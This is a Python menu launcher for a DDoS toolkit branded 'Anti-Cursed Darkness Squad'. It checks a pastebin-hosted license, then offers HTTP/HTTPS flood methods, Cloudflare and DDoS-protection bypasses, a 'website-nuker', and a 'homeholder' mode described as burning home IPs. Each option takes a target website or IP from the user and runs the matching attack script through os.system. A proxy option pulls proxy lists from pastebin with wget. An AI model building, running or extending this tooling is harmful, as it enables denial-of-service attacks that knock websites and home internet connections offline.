# -*- coding: utf-8 -*-
# usr/env/bin/python3.6
import colorama
import sys
import pyarmor
import os
import getpass
from datetime import date
import requests as r

#ingilizce versiyonu

os.system('chmod +x menu.py')
os.system('clear')

version = "2.0"
pcnaam = "z3ntl3"
indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31mroot\033[0m💀\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└─\033[31m#\033[96m "

systeemnaam = getpass.getuser()
today = date.today()
d2 = today.strftime("%B %d, %Y")
developer = f"""
              \033[36m╔══════════════════════════════╗\033[0m
              \033[36m║\033[39m  Anti-Cursed \033[31mDarkness \033[39mSquad  \033[36m║\033[0m
              \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
              \033[36m║                              ║\033[0m
              \033[36m║      \033[31mz3ntl3 \033[31mroot \033[96m(\033[31mEfdal\033[96m)\033[36m     ║\033[0m
              \033[36m╚══════════════════════════════╝\033[0m

\033[31m>>> \033[96mVersion:\033[39m {version}
"""

space = "          "

logo = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

"""
logoexpired = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

\033[31m>>>\033[36m Your License is Expired or INVALID or Wrong PASSWORD

"""

logo2 = f"""
{space}\033[36m    ╔═╗╔╗╔╔╦╗╦       \033[36m╔═╗╦ ╦╦═╗╔═╗╔═╗╔╦╗
{space}\033[36m    ╠═╣║║║ ║ ║  \033[31m───  \033[36m║  ║ ║╠╦╝╚═╗║╣  ║║
{space}\033[36m    ╩ ╩╝╚╝ ╩ ╩       \033[36m╚═╝╚═╝╩╚═╚═╝╚═╝═╩╝\033[0m
{space}\033[31m╔╦╗╔═╗╦═╗╦╔═\033[39m╔╗╔╔═╗╔═╗╔═╗  \033[96m╔═╗╔═╗ ╦ ╦╔═╗╔╦╗
{space}\033[31m ║║╠═╣╠╦╝╠╩╗\033[39m║║║║╣ ╚═╗╚═╗  \033[96m╚═╗║═╬╗║ ║╠═╣ ║║
{space}\033[31m═╩╝╩ ╩╩╚═╩ ╩\033[39m╝╚╝╚═╝╚═╝╚═╝  \033[96m╚═╝╚═╝╚╚═╝╩ ╩═╩╝
                        \033[31mTodays Date:\033[0m
                       {d2}
{developer}

\033[31m>>> \033[39m Logged in.
\033[31m>>> \033[39m CTRL + Z to STOP"""
#

print(logo)


licensiesystem = (r.get("https://pastebin.com/raw/6wdMrW1y").text)



#lisans sistemi



while True:
    if licensiesystem == "VALID":
        print(f"\033[0m\033[36m┌──\033[36m(\033[31mroot\033[0m💀\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└─\033[31m#\033[96m License: {licensiesystem}")
        break
    else:
        print(f"\033[0m\033[36m┌──\033[36m(\033[31mroot\033[0m💀\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└─\033[31m#\033[96m License: {licensiesystem}")
        os.system('python3 menu.py')
        sys.exit()




# os.system('wget https://raw.githubusercontent.com/Z3NTL3/KahootEqualsStraf/main/proxies.txt')

methods = """
\033[96m╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[96m
\033[96m║ \033[36m[\033[39mTOOLS.x\033[36m]\033[0m                                                                                                                               \033[96m║
\033[96m║ \033[31m>>> \033[39mproxy-crawl \033[31m: \033[36m Crawl PROXIES \033[31m[\033[32mActive\033[31m]\033[0m                                                                                               \033[96m║
\033[96m╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m


\033[96m╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[96m
\033[96m║ \033[36m[\033[39mMETHODS\033[36m]\033[0m                                                                                                                               \033[96m║
\033[96m║ \033[31m>>> \033[39mhttp-root \033[31m: \033[36m Strong HTTP attack without CF Bypass. \033[31m[\033[32mActive\033[31m]\033[0m                                                                         \033[96m║
\033[96m║ \033[31m>>> \033[39mhttp-vip \033[31m: \033[36m Strong HTTP attack sending alot of req, without CF Bypass. \033[31m[\033[32mActive\033[31m]\033[0m                                                     \033[96m║
\033[96m║ \033[31m>>> \033[39mcf-bypass \033[31m: \033[36m Proxied attack with CF Bypass System. \033[31m[\033[32mActive\033[31m]\033[0m                                                                         \033[96m║
\033[96m║ \033[31m>>> \033[39mhttps-root \033[31m: \033[36m Strong HTTPS attack without CF Bypass. \033[31m[\033[32mActive\033[31m]\033[0m                                                                       \033[96m║
\033[96m║ \033[31m>>> \033[39mwebsite-nuker-https \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast [HTTPS] \033[31m[\033[32mActive\033[31m]\033[0m                                 \033[96m║
\033[96m║ \033[31m>>> \033[39mwebsite-nuker-http \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast [HTTP] \033[31m[\033[32mActive\033[31m]\033[0m                                   \033[96m║
\033[96m║ \033[31m>>> \033[39mhomeholder \033[31m: \033[36m Burns how IP's \033[31m[\033[32mActive\033[31m]\033[0m                                                                                               \033[96m║
\033[96m╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m


\033[96m╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[96m
\033[96m║ \033[36m[\033[39mLEGIT\033[36m]\033[0m                                                                                                                                 \033[96m║
\033[96m║ \033[31m>>> \033[39multra-bypass \033[31m: \033[36m Bypasses Blazingfast, DDOS Guard, (js) StormWall , OVH UAM & Cloudflare UAM & Also normal hit could be done \033[31m[\033[32mActive\033[31m]\033[0m\033[96m║
\033[96m╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m
"""
print(methods)

kies = input(indicatorlogo)

while True:
    if kies == "http-root":
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39mhttp-root \033[31m: \033[36m Strong HTTP attack without CF Bypass. \033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
        httprootwebsite = input("\033[31m>>> \033[39mWebsite \033[31m:\033[36m\033[31m")
        httpattackrun = ("python2 http-root.py "+httprootwebsite)
        os.system(httpattackrun)
    if kies == "cf-bypass":
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39mcf-bypass \033[31m: \033[36m Proxied attack with CF Bypass System. \033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
        cfbypasswebsite = input("\033[31m>>> \033[39mWebsite \033[31m:\033[36m\033[31m")
        time = input("\033[31m>>> \033[39mTime \033[31m:\033[36m\033[31m")
        threads = input("\033[31m>>> \033[39mThreads \033[31m:\033[36m\033[31m")
        connections = input("\033[31m>>> \033[39mConnection \033[31m:\033[36m\033[31m")
        cfbypassrunattack = ("node cf-bypass.js " + cfbypasswebsite + " " + time + " " + threads + " " + "proxy.txt" + " " + connections)
        os.system(cfbypassrunattack)
    if kies == "http-vip":
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39mhttp-vip \033[31m: \033[36m Strong HTTP attack no bypasses, alot of req \033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
        httpvipwebsite = input("\033[31m>>> \033[39mWebsite \033[31m:\033[36m\033[31m")
        runattackhttpvip = ("python2 http-vip.py " + httpvipwebsite)
        os.system(runattackhttpvip)
    if kies == "website-nuker-https":
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39mwebsite-nuker-https \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTPS]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
        websitenukerwebsite = input("\033[31m>>> \033[39mWebsite \033[31m:\033[36m\033[31m")
        timewebsitenuker = input("\033[31m>>> \033[39mTime\033[31m:\033[36m\033[31m")
        sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
        os.system(sendattackwebsitenuker)
    if kies == "website-nuker-http":
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39mwebsite-nuker-http \033[31m: \033[36m Bypasses Anti DDOS Tunnels [CF], Destroys Target Verry Fast. Also Non CF. [HTTP]\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
        websitenukerwebsitehttp = input("\033[31m>>> \033[39mWebsite \033[31m:\033[36m\033[31m")
        timewebsitenukerhttp = input("\033[31m>>> \033[39mTime\033[31m:\033[36m\033[31m")
        sendattackwebsitenukerhttp = ("node website-nuker-http.js " + websitenukerwebsitehttp + " " + timewebsitenukerhttp)
        os.system(sendattackwebsitenukerhttp)
    if kies == "https-root":
        os.system('chmod +x https-root')
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39mhttps-root \033[31m: \033[36m Strong HTTPS attack without CF Bypass. \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
        providehttpsroot = input("\033[31m>>> \033[39mWEBSITE \033[31m:\033[36m\033[31m")
        sendhttpsrootattack = ("./https-root -site" + providehttpsroot)
    if kies == "ultra-bypass":
    	os.system('clear')
    	print(logo)
    	print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39multra-bypass \033[31m: \033[36m Bypasses Blazingfast, DDOS Guard, (js) StormWall , OVH UAM & Cloudflare UAM & Also normal hit could be done \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
    	ultrabypasswebsite = input("\033[31m>>> \033[39mWEBSITE \033[31m:\033[36m\033[31m")
    	ultrabypasstime = input("\033[31m>>> \033[39mTIME(seconds) \033[31m:\033[36m\033[31m")
    	couldbeslow = input("\033[31m>>> \033[39mAttack could be slow. But when it starts hitting it destroys nearly everything!\033[31m:\033[36m\033[31m")
    	sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request 5")
    	os.system(sendultrabypassattack	)
    if kies == "homeholder":
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m>>> \033[39mhomeholder \033[31m: \033[36m Burns home IP's\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
        homeholderIP = input("\033[31m>>> \033[39mIP \033[31m:\033[36m\033[31m")
        homeholderPORT = input("\033[31m>>> \033[39mPORT \033[31m:\033[36m\033[31m")
        homeholdertime = input("\033[31m>>> \033[39mTIME \033[31m:\033[36m\033[31m")
        sendtheflood = ("perl homeholder.pl " + homeholderIP + " " + homeholderPORT + " 6650 " + homeholdertime)
        os.system(sendtheflood)
    if kies == "proxy-crawl":
        os.system('clear')
        print(logo)
        print("""
\033[36m[\033[39mTOOLS.x\033[36m]\033[0m

\033[31m>>> \033[39mproxy-crawl \033[31m: \033[36m crawl-proxies\033[31m[\033[32mRUNNING\033[31m]\033[0m
    """)
        os.system('sudo rm proxies.txt')
        os.system('wget https://pastebin.com/raw/wHB9WaeC')
        os.system('sudo mv wHB9WaeC proxies.txt')
        amount = r.get("https://pastebin.com/raw/yrZakbWY")
        z3ntl3rootXX = (amount.text)
        print(str("Proxies last updated on: " + z3ntl3rootXX))
        gobackMENU = input(indicatorlogo + '\n--> Go back menu (y/n):')
        if gobackMENU == "n":
            sys.exit()
        else:
            os.system('python3 menu.py')
            sys.exit()

        

        
    else:
        print(logo)
        print(f"\033[31m>>> \033[39mError-Fetch \033[31m: \033[36m Wrong option.\n")
        os.system('python3 menu.py')
        sys.exit()